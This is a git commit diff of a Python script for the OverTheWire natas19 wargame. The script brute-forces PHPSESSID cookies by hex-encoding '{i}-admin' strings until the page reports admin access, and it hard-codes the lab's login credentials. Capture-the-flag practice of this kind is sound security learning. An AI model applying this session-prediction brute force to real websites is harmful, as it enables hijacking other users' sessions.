ea72d10e51a8e6c31ce77ac9fcc327dd3bae2442
davidoberst <juandavidbustosperez82@gmail.com>
2026-03-03 20:42:08 -0500

    natas20 exploit

--- session_prediction2.py
+++ session_prediction2.py
@@ -5,10 +5,10 @@ import requests
 url = "http://natas19.natas.labs.overthewire.org/"
 auth_variable = ("natas19","tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
 
-print("Running Script")
+print("Running Script...")
 for i in range(641):
- current_id = str(i+"-admin")
- hex_text = current_id.encode("utf-8").hex() #convert result to ASCII
+ payload = f"{i}-admin"
+ current_id = payload.encode().hex()
  cookies_variable = {'PHPSESSID': current_id}
  r = requests.get(url, auth= auth_variable, cookies = cookies_variable)
  if("You are an admin" in r.text):
